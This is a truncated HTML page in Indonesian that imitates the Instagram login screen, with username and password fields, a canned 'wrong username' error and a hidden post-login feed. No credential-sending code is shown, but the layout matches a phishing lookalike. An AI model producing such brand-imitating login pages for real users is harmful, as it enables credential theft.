<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram • Login</title>
<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:-apple-system,
    BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}

 body{
    background:#d5d7d7;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh}

#loginPage{
    width:100%;
    max-width:350px}

.box{
    background:#edc7eb;
    border:1px solid #eebaba;
    padding:40px 40px 20px;
    text-align:center}

.logo{
    font-family:'Brush Script MT',cursive;
    font-size:45px;
    margin-bottom:30px}

input{
    width:100%;
    padding:11px 8px;
    background:#fafafa;
    border:1px solid #dbdbdb;
    border-radius:3px;
    margin-bottom:6px;
    font-size:12px;
    outline:none}

input:focus{
    border-color:#3b0404}

.btn-login{
    width:100%;
    background:#0095f6;
    color:#b46f6f;
    border:none;
    border-radius:8px;
    padding:8px;
    font-weight:600;
    margin-top:12px;
    cursor:pointer;
    opacity:0.7}

.btn-login.active{
    opacity:1}

.divider{
    display:flex;
    align-items:center;
    margin:20px 0;
    color:#8e8e8e;
    font-size:13px;
    font-weight:600}


.divider::before,.divider::after{
    content:"";
    flex:1;
    height:1px;
    background:#dbdbdb}

.divider span{
    margin:0 15px}

.fb{
    color:#385185;
    font-weight:600;
    font-size:14px;
    text-decoration:none}

.small{
    font-size:12px;
    color:#00376b;
    text-decoration:none;
    display:block;
    margin-top:20px}

.box2{
    background:#fff;
    border:1px solid #dbdbdb;
    padding:20px;
    text-align:center;
    margin-top:10px;
    font-size:14px}

.box2 a{
    color:#0095f6;
    text-decoration:none;
    font-weight:600}

/* FEED PAGE */

#feedPage{
    display:none;
    width:100%;
    min-height:100vh;
    background:#fff}

.topbar{
    border-bottom:1px solid #dbdbdb;
    padding:10px 15%;
    display:flex;
    justify-content:space-between;
    align-items:center;
    position:sticky;
    top:0;
    background:#2a0101;
    z-index:10}

.post{
    max-width:470px;
    margin:20px auto;
    border:1px solid #360407;
    border-radius:8px;
    overflow:hidden}

.post-head{
    display:flex;
    align-items:center;
    padding:10px;
    gap:10px}

.avatar{
    width:32px;
    height:32px;
    background:linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5);
    border-radius:50%}

.post img{
    width:100%;
    display:block}
    
.post-action{
    padding:10px 15px}

.error{
    color:#ed4956;
    font-size:12px;
    margin:10px 0;
    display:none}

</style>
</head>
<body>

<!-- HALAMAN LOGIN -->
<div id="loginPage">
    <div class="box">
        <div class="logo">Instagram</div>
        <input type="text" id="user" placeholder="Nomor telepon, nama pengguna, atau email">
        <input type="password" id="pass" placeholder="Kata sandi">
        <button class="btn-login" id="btn">Masuk</button>
        <div class="error" id="error">Username yang anda masuk salah coba lagi</div>
        
        <div class="divider"><span>ATAU</span></div>
        <a href="#" class="fb">Masuk dengan Facebook</a>
        <a href="#" class="small">Lupa
